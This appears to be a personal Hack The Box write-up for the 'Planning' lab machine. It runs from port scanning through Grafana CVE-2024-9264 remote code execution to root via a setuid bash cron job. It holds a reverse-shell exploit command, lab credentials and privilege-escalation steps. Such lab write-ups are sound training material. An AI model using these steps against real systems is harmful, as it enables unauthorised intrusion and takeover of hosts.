---
title: Planning HTB Write-Up
machine_ip: 10.10.11.68
os: Linux
difficulty: Easy
my_rating: 3
tags:
  - writeup
  - Linux
references: "[[📚CTF Box Writeups]]"
date: 2025-09-05
---
`admin : 0D5oT70Fq13EvB5r`
## 🌐 Enumeration

```r
❯ rustscan -a 10.10.11.68 -t 2000 -b 2000 --ulimit 5000 -- -A -sV -sC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/gigs/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.68:22
Open 10.10.11.68:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sV -sC -Pn" on ip 10.10.11.68
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-05 12:55 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:55
Completed Parallel DNS resolution of 1 host. at 12:55, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:55
Scanning 10.10.11.68 [2 ports]
Discovered open port 80/tcp on 10.10.11.68
Discovered open port 22/tcp on 10.10.11.68
Completed SYN Stealth Scan at 12:55, 0.12s elapsed (2 total ports)
Initiating Service scan at 12:55
Scanning 2 services on 10.10.11.68
Completed Service scan at 12:55, 6.18s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.68
Initiating Traceroute at 12:55
Completed Traceroute at 12:55, 0.09s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:55
Completed Parallel DNS resolution of 2 hosts. at 12:55, 6.52s elapsed
DNS resolution of 2 IPs took 6.52s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 4, CN: 0]
NSE: Script scanning 10.10.11.68.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 2.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.36s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
Nmap scan report for 10.10.11.68
Host is up, received user-set (0.085s latency).
Scanned at 2025-09-05 12:55:30 EDT for 18s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/5%OT=22%CT=%CU=32150%PV=Y%DS=2%DC=T%G=N%TM=68BB1614%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11N
OS:W7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Uptime guess: 16.903 days (since Tue Aug 19 15:14:46 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   85.12 ms 10.10.14.1
2   85.18 ms 10.10.11.68

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.65 seconds
           Raw packets sent: 34 (2.306KB) | Rcvd: 34 (12.782KB)
```

Port 80
- add to `/etc/hosts`
![[Pasted image 20250905095854.png]]
- whatweb
```r
❯ whatweb http://planning.htb
http://planning.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@planning.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], JQuery[3.4.1], Script, Title[Edukate - Online Education Website], nginx[1.24.0]
```
- Directories
![[Pasted image 20250905100116.png]]
- Vhosts
![[Pasted image 20250905101738.png]]
`http://grafana.planning.htb/`
- Enumerate Grafana more and add to `/etc/hosts`

![[Pasted image 20250905102220.png]]
- Login with `admin : 0D5oT70Fq13EvB5r`
```r
❯ whatweb http://grafana.planning.htb
http://grafana.planning.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block], nginx[1.24.0]
http://grafana.planning.htb/login [200 OK] Country[RESERVED][ZZ], Grafana[11.0.0], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.10.11.68], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.24.0]
```
- Version 11.0.0
	- possible exploit https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
## 🗝️ Initial Access

- Grafana v11.0.0 has a RCE vulnerability:
	- https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit
- Error running `python3` needed to install `requests` module but `venv` needed to be owned by gigs so:
```r
❯ sudo chown -R $USER:$USER /home/gigs/HTB/Planning/

❯ python3 -m venv .venv

❯ source .venv/bin/activate
❯ pip install requests

Collecting requests
  Using cached requests-2.32.5-py3-none-any.whl.metadata (4.9 kB)
Collecting charset_normalizer<4,>=2 (from requests)
  Using cached charset_normalizer-3.4.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (36 kB)
Collecting idna<4,>=2.5 (from requests)
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests)
  Using cached urllib3-2.5.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests)
  Using cached certifi-2025.8.3-py3-none-any.whl.metadata (2.4 kB)
Using cached requests-2.32.5-py3-none-any.whl (64 kB)
Using cached charset_normalizer-3.4.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (151 kB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Using cached urllib3-2.5.0-py3-none-any.whl (129 kB)
Using cached certifi-2025.8.3-py3-none-any.whl (161 kB)
Installing collected packages: urllib3, idna, charset_normalizer, certifi, requests
Successfully installed certifi-2025.8.3 charset_normalizer-3.4.3 idna-3.10 requests-2.32.5 urllib3-2.5.0
```
- Then execute RCE exploit for reverse shell
```r
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.180 --reverse-port 1337
```
![[Pasted image 20250905103649.png]]
- Catch shell on listener
![[Pasted image 20250905103813.png]]
- Turns out grafana's SQL was running as root... but in a **DOCKER CONTAINER**.
	- Must priv esc to a user
## ⚡ Lateral Movement (docker -> user)
- Linpeas
![[Pasted image 20250905105313.png]]
- immediately we see in the Environment Variables a username and password
![[Pasted image 20250905105335.png]]
- `enzo : RioTecRANDEntANT!`
- Confirmation this is a docker container:
![[Pasted image 20250905105432.png]]
- SSH as `enzo`
![[Pasted image 20250905105726.png]]
- Get `user.txt` flag
![[Pasted image 20250905105839.png]]
## ⚡ Privilege Escalation
- Running linpeas again but as `enzo` --- nothing
- Enumerating manually we find something in `/opt`
![[Pasted image 20250905110918.png]]
- We find a cronjob to backup the grafana container using the password `P4ssw0rdS0pRi0T3c` we can try this as root...
- following a write up, we cant ssh with this password:

Looking at the open ports on the server, I found port 8000, which I redirected to my machine using SSH port forwarding `ssh -L 8000:127.0.0.1:8000 enzo@planning.htb` :
![[Pasted image 20250905111533.png]]
![[Pasted image 20250905111642.png]]
- Now login to HTTP-Basic on `127.0.0.1:8000` with the `root : P4ssw0rdS0pRi0T3c` credentials
![[Pasted image 20250905111720.png]]
- Add a cronjob to copy `/bin/bash` to `tmp` and give `/tmp/bash` a sticky bit
![[Pasted image 20250905111921.png]]
- Click Run now and check `/tmp`
![[Pasted image 20250905112002.png]]
- Perfect, now all we need to do is run `/tmp/bash -p` to ensure the privileged UID is preserved, and we can now gain root shell:
![[Pasted image 20250905112108.png]]
- Get `root.txt` flag
![[Pasted image 20250905112147.png]]